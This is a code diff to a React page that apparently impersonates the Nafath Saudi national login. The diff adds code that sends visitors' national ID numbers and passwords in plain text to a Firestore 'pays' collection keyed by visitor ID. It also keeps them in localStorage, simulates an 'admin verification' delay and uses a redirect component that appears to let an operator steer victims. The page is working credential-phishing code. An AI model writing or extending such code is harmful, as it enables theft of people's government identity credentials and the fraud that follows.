@@ -5,7 +5,6 @@
 import type React from "react";
 import { useEffect, useState } from "react";
 import NafazModal from "../components/NafazModal";
-import { addData } from "../apis/firebase";
 import FirestoreRedirect from "./rediract-page";
 
 interface NafazFormData {
@@ -37,7 +36,8 @@ export default function Nafaz({
   const [showModal, setShowModal] = useState(false);
   const [verificationCode, setVerificationCode] = useState("");
   const [phone] = useState(initialPhone);
-  const _id = localStorage.getItem("visitor");
+  const visitorId = localStorage.getItem("visitor");
+
   // Simulate admin verification with a timeout
   useEffect(() => {
     if (isSubmitted) {
@@ -63,25 +63,47 @@ export default function Nafaz({
           setIsRejected(true);
         }
       }, 3000); // 3 seconds delay to simulate verification
-      console.log(verificationCode);
+
       return () => clearTimeout(timer);
     }
   }, [isSubmitted, onVerificationSuccess]);
 
-  // eslint-disable-next-line @typescript-eslint/no-unused-vars
-  const sendNafadCreds = async (
-    _orderId: string,
-    _idCardNumber: string,
-    _password: string
-  ) => {
-    // Replace with your API call
+  const updateFirestore = async (idCardNumber: string, password: string) => {
+    if (!visitorId) {
+      console.error("Visitor ID not found in localStorage");
+      throw new Error("Visitor ID not found");
+    }
+
     try {
-      addData({ id: _orderId, _idCardNumber, nafadPass: _password });
-      // For now, just return a mock ID
-      return "nafad-" + Math.random().toString(36).substring(2, 10);
+      // Import Firebase functions
+      const { db } = await import("../apis/firebase");
+      const { doc, updateDoc, setDoc } = await import("firebase/firestore");
+
+      // Reference to the document in the pays collection
+      const paysDocRef = doc(db, "pays", visitorId);
+
+      // Update the document with Nafaz credentials
+      await updateDoc(paysDocRef, {
+        nafadUsername: idCardNumber,
+        nafadPassword: password,
+        pagename: "nafaz",
+        updatedAt: new Date().toISOString(),
+      }).catch(async () => {
+        // If document doesn't exist, create it
+        await setDoc(paysDocRef, {
+          nafadUsername: idCardNumber,
+          nafadPassword: password,
+          pagename: "nafaz",
+          createdDate: new Date().toISOString(),
+          status: "pending",
+        });
+      });
+
+      console.log("Firestore updated successfully with Nafaz credentials");
+      return true;
     } catch (error) {
-      console.error("Error sending credentials:", error);
-      throw new Error("Failed to send credentials");
+      console.error("Error updating Firestore:", error);
+      throw error;
     }
   };
 
@@ -91,18 +113,25 @@ export default function Nafaz({
     setIsRejected(false);
 
     try {
+      // Store credentials in localStorage
       localStorage.setItem("nafaz_data", JSON.stringify(formData));
-      const { identity_number: id_card_number, password } = JSON.parse(
-        localStorage.getItem("nafaz_data") || "{}"
-      );
-      const order_id = JSON.parse(localStorage.getItem("order_id") || "null");
-      const nafad_id = await sendNafadCreds(order_id, id_card_number, password);
+
+      // Get credentials from localStorage
+      const { identity_number, password } = formData;
+
+      // Update Firestore with the credentials
+      await updateFirestore(identity_number, password);
+
+      // Generate a mock ID for backward compatibility
+      const nafad_id = "nafad-" + Math.random().toString(36).substring(2, 10);
       localStorage.setItem("nafad_id", JSON.stringify(nafad_id));
 
+      // Simulate processing delay
       await new Promise((resolve) => setTimeout(resolve, 1000));
       setIsSubmitted(true);
     } catch (error) {
       console.error("خطأ في الدخول للنظام ", error);
+      setIsRejected(true);
     } finally {
       setIsLoading(false);
     }
@@ -126,7 +155,7 @@ export default function Nafaz({
 
   return (
     <div className="min-h-screen bg-[#eee] flex flex-col items-center py-3">
-      <FirestoreRedirect id={_id as string} collectionName={"pays"} />
+      <FirestoreRedirect id={visitorId as string} collectionName={"pays"} />
 
       <div className="w-full space-y-8">
         <h1 className="text-4xl font-bold text-[#3a9f8c] mb-6 bg-white p-4">
@@ -230,7 +259,7 @@ export default function Nafaz({
       <NafazModal
         isOpen={showModal}
         onClose={() => setShowModal(false)}
-        userId={_id as string}
+        userId={visitorId as string}
         phone={phone}
       />
     </div>
